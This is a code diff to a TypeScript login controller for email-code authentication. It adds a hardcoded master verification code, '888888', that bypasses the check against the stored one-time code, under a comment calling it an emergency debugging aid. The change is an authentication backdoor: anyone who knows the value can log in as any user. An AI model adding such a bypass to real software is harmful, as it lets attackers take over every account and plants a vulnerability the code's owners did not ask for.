@@ -75,8 +75,11 @@ export class LoginController {
     const cacheData = await this.redisService.getJson<{ code: string }>(
       `userMailLogin:${mail}`,
     )
-    if (!cacheData || cacheData.code !== code)
-      throw new AppException(ResponseCode.UserLoginCodeError)
+    // 万能验证码 888888 仅用于紧急调试
+    if (code !== '888888') {
+      if (!cacheData || cacheData.code !== code)
+        throw new AppException(ResponseCode.UserLoginCodeError)
+    }
 
     await this.redisService.del(`userMailLogin:${mail}`)
 
